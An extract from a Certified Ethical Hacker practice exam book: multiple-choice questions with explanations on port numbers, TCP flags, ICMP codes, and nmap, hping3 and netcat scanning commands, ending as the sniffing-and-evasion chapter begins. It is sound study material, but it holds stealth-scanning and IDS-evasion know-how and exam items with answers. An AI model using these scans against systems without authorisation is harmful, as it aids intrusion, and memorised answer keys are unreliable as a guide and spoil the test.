☑ E. You will probably see three to five questions on port numbering alone. So just
exactly how do you commit 1024 port numbers (0–1023 is the well-known range) to
memory when you have all this other stuff to keep track of? You probably won’t, and
maybe you can’t. The best advice I can give you is to memorize the really important
ones—the ones you know beyond a shadow of a doubt you’ll see on the exam
somewhere—and then use the process of elimination to get to the right answer.

For example, suppose you had no idea that TCP port 631 was used by the Internet
Printing Protocol (IPP), but you did know what 53, 88, and 445 were for. Suddenly
it’s not that difficult (now down to a 50/50 chance). By the way, 631 won’t be the
only thing you’ll be monitoring for, but of the answers provided, it is the best choice.

☐✗ A is incorrect because 53 is the port number used by DNS (TCP and UDP). The TCP
side will be used for across-Internet traffic, where the loss of speed due to connection-
oriented traffic is worth it to ensure delivery, and UDP will be mostly internal.

☐✗ B is incorrect because 88 is the port number used by Kerberos.

☐✗ C is incorrect because 445 is used for Microsoft SMB file sharing. You’ll definitely see
SMB file sharing and this port somewhere on the exam, usually as part of a scenario
like the one in this question.

☐✗ D is incorrect because 514 is the (UDP) port number used by syslog—and trust me,
you need to know this one. EC-Council loves syslog. You’ll definitely see it a couple
of times on the exam.

CEH Certified Ethical Hacker Practice Exams

70

03-ch03.indd 70 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

7. A colleague enters the following command:
root@mybox: # hping3 -A 192.168.2.x -p 80

What is being attempted here?

A. An ACK scan using hping3 on port 80 for a single address

B. An ACK scan using hping3 on port 80 for a group of addresses

C. Address validation using hping3 on port 80 for a single address

D. Address validation using hping3 on port 80 for a group of addresses

☑ B. Hping is a great tool that provides a variety of options. You can craft packets with it,
audit and test firewalls, and do all sorts of crazy man-in-the-middle stuff with it. In this
example, you’re simply performing a basic ACK scan (the -A switch) using port 80 (-p 80)
on an entire Class C subnet (the x in the address runs through all 254 possibilities).
Hping3, the latest version, is scriptable (TCL language) and implements an engine
that allows a human-readable description of TCP/IP packets.

☐✗ A is incorrect because the syntax is for an entire subnet (or, I guess to be technically
specific, all 254 addresses that start with 192.168.2). The x in the last octet tells hping
to fire away at all those available addresses.

☐✗ C and D are both incorrect because “address validation” is not a scan type.

8. You are examining traffic between hosts and note the following exchange:
Source Prot Port Flag Destination
192.168.5.12 TCP 4082 FIN/URG/PSH 192.168.5.50
192.168.5.12 TCP 4083 FIN/URG/PSH 192.168.5.50
192.168.5.12 TCP 4084 FIN/URG/PSH 192.168.5.50
192.168.5.50 TCP 4083 RST/ACK 192.168.5.12
192.168.5.12 TCP 4085 FIN/URG/PSH 192.168.5.50

Which of the following statements are true regarding this traffic? (Choose all that apply.)

A. It appears to be part of an ACK scan.

B. It appears to be part of an XMAS scan.

C. It appears port 4083 is open.

D. It appears port 4083 is closed.

☑ B, D. The exam will ask you to define scan types in many, many ways. It may be a
simple definition match; sometimes it’ll be some crazy Wireshark or tcpdump listing. In
this example, you see a cleaned-up traffic exchange showing packets from one host being
sent one after another to the second host, indicating a scan attempt. The packets have the
FIN, URG, and PSH flags all set, which tells you it’s an XMAS scan. If the destination
port is open, you won’t receive anything back; if it’s closed, you’ll see a RST/ACK. This
tells you port 4083 looks like it’s closed (see line four of the response). As an addendum,
did you know there are two reasons why it’s called an XMAS scan? The first is because it
lights up an IDS like a Christmas tree, and the second is because the flags themselves are
all lit. As an aside, you probably won’t see this much out in the real world because it just
really doesn’t have much applicability. But on your exam? Oh yes—it’ll be there.

Chapter 3: Scanning and Enumeration

71

03-ch03.indd 71 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☐✗ A is incorrect because there is no indication this is an ACK scan. An ACK scan has
only the ACK flag set and is generally used in firewall filter tests: no response means a
firewall is present, and RST means the firewall is not there (or the port is not filtered).

☐✗ C is incorrect because you did receive an answer from the port (a RST/ACK was sent
in the fourth line of the capture).

9. You are examining traffic and notice an ICMP Type 3, Code 13 response. What does this
normally indicate?

A. The network is unreachable.

B. The host is unknown.

C. Congestion control is enacted for traffic to this host.

D. A firewall is prohibiting connection.

☑ D. ICMP types will be covered in depth on your exam, so know them well. Type 3
messages are all about “destination unreachable,” and the code in each packet tells you
why it’s unreachable. Code 13 indicates “communication administratively prohibited,”
which indicates a firewall filtering traffic. Granted, this occurs only when a network
designer is nice enough to configure the device to respond in such a way, and you’ll
probably never get that nicety in the real world, but the definitions of what the “type”
and “code” mean are relevant here.

☐✗ A is incorrect because “network unreachable” is Type 3, Code 0. It’s generated by a
router to inform the source that the destination address is unreachable; that is, it does
not have an entry in the route table to send the message to.

☐✗ B is incorrect because “host unknown” is Type 3, Code 7. There’s a route to the
network the router knows about, but that host is not there (this sometimes refers to a
naming or DNS issue).

☐✗ C is incorrect because “congestion control” ICMP messaging is Type 4.

10. Which port-scanning method presents the most risk of discovery but provides the most
reliable results?

A. Full-connect

B. Half-open

C. Null scan

D. XMAS scan

☑ A. A full-connect scan runs through an entire TCP three-way handshake on all ports
you aim at. It’s loud and easy to see happening, but the results are indisputable. As
an aside, the -sT switch in nmap runs a full-connect scan (you should go ahead and
memorize that one).

☐✗ B is incorrect because a half-open scan involves sending only the SYN packet and
watching for responses. It is designed for stealth but may be picked up on IDS sensors
(both network and most host-based IDSs).

CEH Certified Ethical Hacker Practice Exams

72

03-ch03.indd 72 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☐✗ C is incorrect because a null scan sends packets with no flags set at all. Responses will
vary, depending on the OS and version, so reliability is spotty. As an aside, null scans
are designed for Unix/Linux machines and don’t work on Windows systems.

☐✗ D is incorrect because although an XMAS scan is easily detectable (as our technical
editor put it, “A fairly well-trained monkey would see it”), the results are oftentimes
sketchy. The XMAS scan is great for test questions but won’t result in much more
than a derisive snort and an immediate disconnection in the real world.

11. As a pen test on a major international business moves along, a colleague discovers an IIS
server and a mail exchange server on a DMZ subnet. You review a ping sweep accomplished
earlier in the day on that subnet and note neither machine responded to the ping. What
is the most likely reason for the lack of response?

A. The hosts might be turned off or disconnected.

B. ICMP is being filtered.

C. The destination network might be down.

D. The servers are Linux based and do not respond to ping requests.

☑ B. Admittedly, this one is a little tricky, and, yes, I purposefully wrote it this way
(mainly because I’ve seen questions like this before). The key here is the “most likely”
designator. It’s entirely possible—dare I say, even expected—that the systems administrator
for those two important machines would ensure ICMP is filtered. Of the choices
provided, this one is the most likely explanation.

☐✗ A is incorrect, but only because there is a better answer. This is a major firm that
undoubtedly does business at all times of day and with customers and employees around
the world (the question did state it was an international business). Is it possible that both
these servers are down? Sure, you might have timed your ping sweep so poorly that you
happened to hit a maintenance window or something, but it’s highly unlikely.

☐✗ C is incorrect because, frankly, the odds of an entire DMZ subnet being down while
you’re pen testing are very slim. And I can promise you that if the subnet did drop
while you were testing, your test is over.

☐✗ D is incorrect because this is simply not true.

12. A team member is using nmap and asks about the “scripting engine” in the tool. Which
option switches can be used to invoke the nmap scripting engine? (Choose two.)

A. --script

B. -z

C. -sA

D. -sC

Chapter 3: Scanning and Enumeration

73

03-ch03.indd 73 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☑ A, D. Nmap is a great scanning tool that provides numerous options, and you’ll need
to know the syntax very well. The NSE (Nmap Scripting Engine) is a portion of the
tool that allows the use of scripts in scanning. Directly from nmap’s site (https://
nmap.org/book/nse.html): “NSE is activated with the -sC option (or --script if you
wish to specify a custom set of scripts) and results are integrated into Nmap normal
and XML output.”

I’ve seen mentioned in other study material that the -A switch is also considered as
an NSE function. This switch turns on scanning that reports on version detection,
operating system fingerprinting, and a variety of other activities. A pretty good
wrap-up of nmap switches is located at https://nmap.org/book/port-scanning-
options.html.

☐✗ B is incorrect because -z isn’t an nmap switch.

☐✗ C is incorrect because the -sA switch runs an ACK scan (ACK segments are sent to
ports to determine their state).

13. Which of the following commands is the best choice to use on a Linux machine when
attempting to list processes and the UIDs associated with them in a reliable manner?

A. ls

B. chmod

C. pwd

D. lsof

☑ D. Supported in most Unix-like flavors, the “list open files” command (lsof ) provides
a list of all open files and the processes that opened them. The lsof command describes,
among other things, the identification number of the process (PID) that has opened
the file, the command the process is executing, and the owner of the process. With
optional switches, you can also receive all kinds of additional information. As an
aside, the command ps (for process status) is probably an even better choice for the
task listed.

☐✗ A is incorrect because ls (list) simply displays all the files and folders in your current
directory. Its counterpart in the PC world is dir.

☐✗ B is incorrect because chmod is used to set permissions on files and objects in Linux.

☐✗ C is incorrect because pwd (print working directory) is a command used to display
the directory you are currently working in.

14. You want to display active and inactive services on a Windows Server machine. Which of
the following commands best performs this service?

A. sc query

B. sc query type=all

C. sc query type=service

D. sc query state= all

CEH Certified Ethical Hacker Practice Exams

74

03-ch03.indd 74 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☑ D. The sc command will definitely make an appearance or two somewhere on the
exam. Per Microsoft, SC.exe retrieves and sets control information about services.
You can use SC.exe for testing and debugging service programs. Service properties
stored in the registry can be set to control how service applications are started at boot
time and run as background processes. SC.exe parameters can configure a specific
service, retrieve the current status of a service, as well as stop and start a service.

A sampling of uses for the sc command follows:

• sc config Determines the status of a service at system startup as well as sets a
service to run automatically, manually, or not at all.

• sc query Displays information about services, drivers, and types of both.
Without parameters, it returns a list of all running services and associated
information. To create a list of all services, use sc query state= all.

• sc start Starts a service that is not running.

• sc stop Stops a running service.

• sc pause Pauses a service.

• sc continue Resumes a paused service.

• sc enumdepend Lists the services that cannot run unless the specified service is
running.

• sc qc Displays the configuration of a particular service.

And finally, one more quick note: Remember there is always a space after the equals
sign (and not one before). Syntax is important, and ECC will probably spring that
on you.

☐✗ A, B, and C all use incorrect syntax for the question asked.

15. An administrator enters the following command on a Linux system:
iptables -t nat -L

Which of the following best describes the intent of the command entered?

A. The administrator is attempting a port scan.

B. The administrator is configuring IP masquerading.

C. The administrator is preparing to flood a switch.

D. The administrator is preparing a DoS attack.

☑ B. Do you remember network address translation? It’s a neat little technology
that allows lots of internal hosts, using nonroutable private addressing, to access
the Internet by borrowing and using a single address (or a group of addresses)
managed by a router or other system. IP masquerading is much the same thing;
it’s just accomplished through a Linux host. In short, a Linux machine can act as
a NAT translator by employing proper routing configuration, using one NIC to
communicate with the internal network and one with the external network, and
enabling IP masquerading.

Chapter 3: Scanning and Enumeration

75

03-ch03.indd 75 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

Looking over the man page for the command (one copy can be found at http://
ipset.netfilter.org/iptables.man.html), we see that iptables is an administration tool
for IPv4 packet filtering and NAT. Per the man page, “Iptables is used to set up,
maintain, and inspect the tables of IPv4 packet filter rules in the Linux kernel. Several
different tables may be defined.” Each table contains a number of built-in chains
and may be enabled by iptables -t tablename -switch, where tablename is filter, nat,
mangle, raw, or security, and switch equates to the option you wish to enable. For
example, -A appends rules, -D deletes rules, and -R replaces rules.

☐✗ A, C, and D are incorrect because they do not accurately represent what is being
attempted.

16. What is being attempted with the following command?
nc -u -v -w2 192.168.1.100 1-1024

A. A full-connect scan on ports 1–1024 for a single address

B. A full-connect scan on ports 1–1024 for a subnet

C. A UDP scan of ports 1–1024 on a single address

D. A UDP scan of ports 1–1024 on a subnet

☑ C. In this example, netcat is being used to run a scan on UDP ports (the -u
switch gives this away) from 1 to 1024. The address provided is a single address,
not a subnet. Other switches in use here are -v (for verbose) and -w2 (defines the
two-second timeout for connection, where netcat will wait for a response).

☐✗ A is incorrect because the -u switch shows this as a UDP scan. By default (that is, no
switch in place), netcat runs in TCP.

☐✗ B is incorrect because the -u switch shows this as a UDP scan. Additionally, this
command is aimed at a single address, not a subnet.

☐✗ D is incorrect because this command is aimed at a single address, not a subnet.

17. You are told to monitor a packet capture for any attempted DNS zone transfer. Which
port should you focus your search on?

A. TCP 22

B. TCP 53

C. UDP 22

D. UDP 53

☑ B. DNS uses port 53 in both UDP and TCP. Port 53 over UDP is used for DNS
lookups. Zone transfers are accomplished using port 53 over TCP. Considering the
reliability and error correction available with TCP, this makes perfect sense.

☐✗ A is incorrect because TCP port 22 is assigned for SSH, not DNS.

CEH Certified Ethical Hacker Practice Exams

76

03-ch03.indd 76 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☐✗ C is incorrect because UDP port 22 simply doesn’t match up with SSH (SSH is TCP
based). It has traditionally been used as an old pcAnywhere port.

☐✗ D is incorrect because UDP port 53 is used for DNS lookups. Because lookups are
generally a packet or two, and we’re concerned with speed on a lookup, UDP’s fire-
and-forget speed advantage is put to use here.

18. A team member issues the nbtstat.exe -c command. Which of the following best
represents the intent of the command?

A. It displays the IP route table for the machine.

B. It displays the NetBIOS name cache.

C. It displays active and inactive services.

D. It puts a NIC into promiscuous mode for sniffing.

☑ B. Per Microsoft, regarding the nbtstat command: “Nbtstat is designed to help
troubleshoot NetBIOS name resolution problems. When a network is functioning
normally, NetBIOS over TCP/IP (NetBT) resolves NetBIOS names to IP addresses.
It does this through several options for NetBIOS name resolution, including local
cache lookup, WINS server query, broadcast, LMHOSTS lookup, Hosts lookup,
and DNS server query. The nbtstat command removes and corrects preloaded entries
using a number of case-sensitive switches.” Syntax for the command includes the
following:

• nbtstat - a <name> Performs a NetBIOS adapter status command on the
computer name specified by <name>. The adapter status command returns the
local NetBIOS name table for that computer as well as the MAC address of the
adapter card.

• nbtstat -A <IP address> Performs the same function as the -a switch, but using
a target IP address rather than a name.

• nbtstat - c Shows the contents of the NetBIOS name cache, which contains
NetBIOS-name-to-IP-address mappings.

• nbtstat -n Displays the names that have been registered locally on the system
by NetBIOS applications such as the server and redirector.

• nbtstat -r Displays the count of all NetBIOS names resolved by broadcast and
by querying a WINS server.

• nbtstat -R Purges the name cache and reloads all #PRE entries from the
LMHOSTS file (#PRE entries are the LMHOSTS name entries that are preloaded
into the cache).

• nbtstat -RR Sends name release packets to the WINS server and starts a refresh,
thus re-registering all names with the name server without a reboot being required.

• nbtstat -S Lists current NetBIOS sessions and their status, including statistics.

Chapter 3: Scanning and Enumeration

77

03-ch03.indd 77 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☐✗ A, C, and D are incorrect because they do not match the command usage. If you wish
to see the route table on a Windows system, use the route print command. The sc
query state= all command will show all the active and inactive services on the system.
To put the NIC in promiscuous mode, you’d need the WinPcap driver installed.

19. Consider the ports shown in the nmap output returned on an IP scanned during footprinting:
PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http
139/tcp open netbios-ssn 515/tcp open 631/tcp open ipp 9100/tcp
open MAC Address: 01:2A:48:0B:AA:81

Which of the following is true regarding the output?

A. The host is most likely a router or has routing enabled.

B. The host is most likely a printer or has a printer installed.

C. The host is definitely a Windows server.

D. The host is definitely a Linux server.

☑ B. So this output is pretty interesting, huh? There’s some FTP, Telnet, and HTTP
open, and a little NetBIOS action going on there, too. The TCP ports 515 and 631,
however, are the ones to note here. 515 corresponds to the Line Printer Daemon
protocol/Line Printer Remote protocol (or LPD/LPR), which is used for submitting
print jobs to a remote printer. Port 631 corresponds to the Internet Printing Protocol
(IPP). Both of these point to printing. A final note on this: In our modern world,
the definition of what constitutes a server and what does not is a blurred line. If your
printer allows Telnet access to a terminal, is it really just a printer? For that matter,
many printers actually work off of an embedded operating system. In other words,
in real-world testing, your printer may actually be a Linux OS server of sorts. Your
exam will stick with the academic memorization and evaluation of port numbers, but
things are much more entangled in the real world.

☐✗ A is incorrect because none of these ports show anything related to routing.

☐✗ C and D are incorrect because there is simply not enough information to definitively
identify the operating system in use. Yes, it is true that the Line Printer Daemon
protocol was originally in the BSD UNIX operating system; however, it is used
regardless of OS.

20. The following results are from an nmap scan:
Starting nmap V. 3.10A ( www.insecure.org/nmap/
<http://www.insecure.org/nmap/> )
Interesting ports on 192.168.15.12:
(The 1592 ports scanned but not shown below are in state: filtered)
Port State Service
21/tcp open ftp
25/tcp open smtp
53/tcp closed domain
80/tcp open http
443/tcp open https
Remote operating system guess: Too many signatures match to

reliably guess the OS.
Nmap run completed -- 1 IP address (1 host up) scanned in 263.47 seconds

CEH Certified Ethical Hacker Practice Exams

78

03-ch03.indd 78 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

Which of the following is the best option to assist in identifying the operating system?

A. Attempt an ACK scan.

B. Traceroute to the system.

C. Run the same nmap scan with the -vv option.

D. Attempt banner grabbing.

☑ D. Of the options presented, banner grabbing is probably your best bet. In fact, it’s
a good start for operating system fingerprinting. You can telnet to any of these active
ports or run an nmap banner grab. Either way, the returning banner may help in
identifying the OS.

☐✗ A is incorrect because an ACK scan isn’t necessarily going to help here. For that
matter, it may have already been run.

☐✗ B is incorrect because traceroute does not provide any information on fingerprinting.
It will show you a network map, hop by hop, to the target, but it won’t help tell you
whether it’s a Windows machine.

☐✗ C is incorrect because the -vv switch provides only more (verbose) information on
what nmap already has. Note that the original run presented this message on the OS
fingerprinting effort: “Remote operating system guess: Too many signatures match to
reliably guess the OS.”

21. You want to run a scan against a target network. You’re concerned about it being a reliable
scan, with legitimate results, but want to take steps to ensure it is as stealthy as possible.
Which scan type is best in this situation?

A. nmap -sN targetIPaddress

B. nmap -sO targetIPaddress

C. nmap -sS targetIPaddress

D. nmap -sT targetIPaddress

☑ C. A half-open scan, as defined by this nmap command line, is the best option in
this case. The SYN scan was created with stealth in mind because the full-connect
scan was simply too noisy (or created more entries in an application-level logging
system, whichever your preference). As far as the real world is concerned, it’s a
fact that most IDSs can pick up a SYN scan just as easily as a full connect, but
if you go slow enough, both a SYN and a full connect can be almost invisible. A
connect scan is indistinguishable from a real connection, whereas a SYN scan can
definitely be distinguishable. In other words, the full connect will look like any other
conversation—just bunches of them all at once—whereas a SYN scan will show a
lot of systems answering a conversation starter only to be met with rude silence. The
lesson is any scan can and probably will be seen in the real world by a monitoring
IDS; however, the slower you go and the better you characterize your target without
putting additional packets on the wire, the less chance you’ll have of being seen, all
things being equal.

Chapter 3: Scanning and Enumeration

79

03-ch03.indd 79 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☐✗ A is incorrect because a null scan may not provide the reliability you’re looking for.
Remember, this scan won’t work on a Windows host at all.

☐✗ B is incorrect because the -sO switch tells you this is an operating system scan.
Fingerprinting scans are not stealthy by anyone’s imagination, and they won’t provide
the full information you’re looking for here.

☐✗ D is incorrect because the -sT option indicates a full-connect scan. Although this is
reliable, it is noisy, and you will most likely be discovered during the scan.

22. What is the second step in the TCP three-way handshake?

A. SYN

B. ACK

C. SYN/ACK

D. ACK-SYN

E. FIN

☑ C. Admittedly, this is an easy one, but I’d bet dollars to doughnuts you will see it in
some form on your exam. It’s such an important part of scanning and enumeration
because, without understanding this basic principle of communication channel
setup, you’re almost doomed to failure. A three-way TCP handshake has the originator
forward a SYN. The recipient, in step 2, sends a SYN and an ACK. In step 3, the
originator responds with an ACK. The steps are referred to as SYN, SYN/ACK, ACK.

☐✗ A is incorrect because SYN is the first step (flag set) in the three-way handshake.

☐✗ B is incorrect because ACK is the last step (flag set) in the three-way handshake.

☐✗ D is incorrect because of the order listed. True, both these flags are the ones set in the
three-way handshake. However, in the discussion of this step-by-step process, at least
as far as your exam is concerned, it’s SYN/ACK, not the other way around. And, yes,
this distractor, in some form, will most likely be on your exam. You won’t care about
the order in the real world since flags are a mathematical property of the packet and
not some ridiculous order, but for your exam you’ll need to know it this way.

☐✗ E is incorrect because the FIN flag brings an orderly close to a communication session.

23. In which scanning method would an attacker send INIT chunks to targets and await
responses?

A. SCTP INIT scan

B. SCTP COOKIE ECHO scan

C. SCTP half-open scan

D. SCTP full-connect scan

CEH Certified Ethical Hacker Practice Exams

80

03-ch03.indd 80 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☑ A. This one requires a bit of background knowledge, so read on.

In October 2000, SCTP (Stream Control Transmission Protocol) became an IETF
Proposed Standard and was published as RFC 2960. It was originally designed
within the IETF Signaling Transport (SIGTRAN) working group to address TCP’s
shortcomings relating to telephony signaling over IP networks, and it has since
evolved into a general-purpose IETF transport protocol. SCTP provides a connection-
oriented, reliable, full-duplex, congestion- and flow-controlled layer 4 channel;
however, unlike both TCP and UDP, SCTP offers new delivery options that better
match diverse applications’ needs.

Whereas you’re probably familiar with the three-way handshake of TCP, SCTP uses
a four-way handshake (you can read all the technical details at https://datatracker.ietf
.org/doc/html/rfc4960):

1. The client sends an INIT signal to the server to initiate an association.

2. On receipt of the INIT signal, the server sends an INIT-ACK response to the
client. This INIT-ACK signal also contains a “state cookie.” This cookie holds
an assortment of information, including a message authentication code (MAC),
a timestamp corresponding to the creation of the cookie, the life span of the state
cookie, and other information necessary to establish the connection.

3. On receipt of this INIT-ACK signal, the client sends a COOKIE-ECHO response,
which just echoes the state cookie.

4. The server verifies the state cookie’s authenticity and allocates the resources for
the association, sends a COOKIE-ACK response acknowledging the COOKIE-
ECHO signal, and moves the association to the ESTABLISHED state.

Shutdown for SCTP is just as graceful:

1. The client sends a SHUTDOWN signal to the server.

2. The server responds by sending a SHUTDOWN-ACK acknowledgement.

3. The client then sends a SHUTDOWN-COMPLETE signal back to the server.

SCTP can also abruptly close, using an ABORT signal due to an error in the SCTP
stack or at the request of the client. SCTP does not support half-open connections.

An SCTP INIT scan sends SCTP INIT “chunks” to targets and awaits responses.
If the response is INIT+ACK, the port is open; an ABORT response means the port
is closed.

☐✗ B is incorrect because in an SCTP COOKIE ECHO scan, a cookie echo is sent to
the target. No response indicates the port is open, whereas closed ports will send an
ABORT. As an aside, this scan may be very useful in evading IDS.

☐✗ C and D are incorrect because SCTP half-open or full-connect scan types do not exist.

Chapter 3: Scanning and Enumeration

81

03-ch03.indd 81 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

24. Nmap is a powerful scanning and enumeration tool. What does the following nmap
command attempt to accomplish?
nmap -sA -T4 192.168.15.0/24

A. A serial, slow operating system discovery scan of a Class C subnet

B. A parallel, fast operating system discovery scan of a Class C subnet

C. A serial, slow ACK scan of a Class C subnet

D. A parallel, fast ACK scan of a Class C subnet

☑ D. You are going to need to know nmap switches well for your exam. In this example,
the -A switch indicates an ACK scan, and the -T4 switch indicates an “aggressive” scan,
which runs fast and in parallel.

☐✗ A is incorrect because a slow, serial scan would use the -T, -T0, or -T! switch. Additionally,
the OS detection switch is -O, not -A.

☐✗ B is incorrect because, although this answer got the speed of the scan correct, the
operating system detection portion is off.

☐✗ C is incorrect because, although this answer correctly identified the ACK scan switch,
the -T4 switch was incorrectly identified.

25. You are examining a packet capture of all traffic from a host on the subnet. The host sends
a segment with the SYN flag set in order to set up a TCP communications channel. The
destination port is 80, and the sequence number is set to 10. Which of the following
statements are not true regarding this communications channel? (Choose all that apply.)

A. The host will be attempting to retrieve an HTML file.

B. The source port field on this packet can be any number between 1024 and 65535.

C. The first packet from the destination in response to this host will have the SYN and
ACK flags set.

D. The packet returned in answer to this SYN request will acknowledge the sequence
number by returning 10.

☑ A, D. Yes, it is true that port 80 traffic is generally HTTP; however, there are
two problems with this statement. The first is all that is happening here is an
arbitrary connection to something on port 80. For all we know, it’s a listener, Telnet
connection, or anything at all. Second, assuming it’s actually an HTTP server, the
sequence described here would do nothing but make a connection—not necessarily
transfer anything. Sure, this is picky, but it’s the truth. Next, sequence numbers are
acknowledged between systems during the three-way handshake by incrementing
by 1. In this example, the source sent an opening sequence number of 10 to the
recipient. The recipient, in crafting the SYN/ACK response, will first acknowledge
the opening sequence number by incrementing it to 11. After this, it will add its own
sequence number to the packet (a random number it will pick) and send both off.

CEH Certified Ethical Hacker Practice Exams

82

03-ch03.indd 82 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☐✗ B is incorrect because it’s a true statement. Source port fields are dynamically assigned
using anything other than the “well-known” port range (0–1023). IANA has defined
the following port number ranges: ports 1024 to 49151 are the registered ports
(assigned by IANA for specific service upon application by a requesting entity), and
ports 49152 to 65535 are dynamic or private ports that cannot be registered with IANA.

☐✗ C is incorrect because it’s a true statement. The requesting machine has sent the
first packet in the three-way handshake exchange—a SYN packet. The recipient will
respond with a SYN/ACK and wait patiently for the last step—the ACK packet.

26. Which TCP flag instructs the recipient to ignore buffering constraints and immediately
send all data?

A. URG

B. PSH

C. RST

D. BUF

☑ B. This answer normally gets mixed up with the URG flag because we all read it as
“urgent.” However, just remember the key word with PSH is “buffering.” In TCP,
buffering is used to maintain a steady, harmonious flow of traffic. Every so often,
though, the buffer itself becomes a problem, slowing things down. A PSH flag tells
the recipient stack that the data should be pushed up to the receiving application
immediately.

☐✗ A is incorrect because the URG flag is used to inform the receiving stack that certain
data within a segment is urgent and should be prioritized. As an aside, URG isn’t
used much by modern protocols.

☐✗ C is incorrect because the RST flag forces a termination of communications
(in both directions).

☐✗ D is incorrect because BUF isn’t a TCP flag at all.

27. You receive a RST-ACK from a port during a SYN scan. What is the state of the port?

A. Open

B. Closed

C. Filtered

D. Unknown

☑ B. Remember, a SYN scan occurs when you send a SYN packet to all open ports. If
the port is open, you’ll obviously get a SYN/ACK back. However, if the port is closed,
you’ll get a RST-ACK.

☐✗ A is incorrect because an open port would respond differently (SYN/ACK).

Chapter 3: Scanning and Enumeration

83

03-ch03.indd 83 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☐✗ C is incorrect because a filtered port would likely not respond at all. (The firewall
wouldn’t allow the packet through, so no response would be generated.)

☐✗ D is incorrect because you know exactly what state the port is in because of the
RST-ACK response.

28. A penetration tester is examining the following NMAP result:
Starting NMAP 5.21 at 2022-07-08 11:06 NMAP scan report for 172.16.40.65
Host is up (1.00s latency). Not shown: 993 closed ports
PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http
139/tcp
open netbios-ssn 515/tcp open 631/tcp open ipp 9100/tcp
open MAC Address: 00:00:48:0D:EE:8

Which of the following is a true statement?

A. The host is likely a printer.

B. The host is likely a Windows machine.

C. The host is likely a Linux machine.

D. The host is likely a router.

☑ A. Honestly there’s not a lot to go on here, so we take a look at the port numbers:
21, 23, and 80 don’t really tell us much, because loads of hosts can run FTP, Telnet,
and HTTP, but 515 and 631? Those have printer written all over them: 515 is
a well-known printer spooler port (and is often used by malware), and 631 is the
Internet Printing Protocol (IPP) port.

☐✗ B, C, and D are incorrect because there is no indication from this result the host is
any of these.

CEH Certified Ethical Hacker Practice Exams

84

03-ch03.indd 84 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

CHAPTER

Sniffing and Evasion 4
This chapter includes questions from the following topics:

• Describe sniffing concepts, including active and passive sniffing and protocols
susceptible to sniffing

• Describe ethical hacking techniques for Layer 2 traffic
• Describe sniffing tools and understand their output
• Describe sniffing countermeasures
• Learn about intrusion detection system (IDS), firewall, and honeypot types, use,

and placement
• Describe IDS, firewall, and honeypot evasion techniques

Overhearing a conversation, whether intentionally or via eavesdropping, is just part of our daily
lives. Sometimes we sniff conversations without even meaning or trying to—it just happens.
Anyone who has worked in a cube-farm office environment knows how easy it is to overhear
conversations even when we don’t want to. Or, if you have kids in your house who don’t yet
understand that sound travels, eavesdropping is a constant part of your day.

Sometimes our very nature makes it impossible not to listen in. A study in Psychological Science
explored a “paradox of eavesdropping”: it’s harder to not listen to a conversation when someone
is talking on the phone (we hear only one side of the dialogue) than when two physically present
people are talking to each other. Although the phone conversation contains much less information,
we’re much more curious about what’s being said. That means we’re hardwired to want to listen
in. We can’t help it.

But come on, admit it—you enjoy it sometimes, too. Overhearing a juicy piece of information
just makes us happy and, for the gossip crowd, provides lots of ammunition for the next water-
cooler session. And we all really like secrets. In fact, I think the thrill of learning and knowing a
secret is matched only by the overwhelming desire to share it. For those working in the classified
arena, this paradox of human nature is something that has to be guarded against every single day
of their working lives.

Eavesdropping in the virtual world is almost always not accidental—there’s purpose involved.
You don’t necessarily need to put a whole lot of effort into it, but it almost never happens on its own
without your purposeful manipulation of something. Sniffing provides a variety of information to
the ethical hacker and is a skill all should be intimately familiar with. Just know that the secrets
you overhear on your job as a pen tester might be really exciting, and you might really want to tell
somebody about them, but you may find yourself really in jail over it too.

85

04-ch04.indd 85 11/04/22 11:42 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 4

STUDY TIPS The good news is, once again there hasn’t been very much
updated from previous versions regarding sniffing and evasion—so any
study you’ve put in previously will still apply. The bad news is, it’s still tough
stuff, and sometimes the questions are picky. Just as with everything else,

review your basic network knowledge thoroughly. You’ll see lots of questions designed
to test your knowledge on how networking devices handle traffic, how addressing affects
packet flow, what layers sniffing concentrates in (Layer 2, and sometimes Layer 3), and
which protocols are more susceptible to sniffing than others.

Additionally, learn Wireshark very well. Pay particular attention to filters within
Wireshark—how to set them up and what syntax they follow—and how to read a capture
(not to mention the “follow TCP stream” option). If you haven’t already, download
Wireshark and start playing with it—right now, before you even read the questions that
follow. On any exam questions that show a Wireshark screen capture, pay close attention
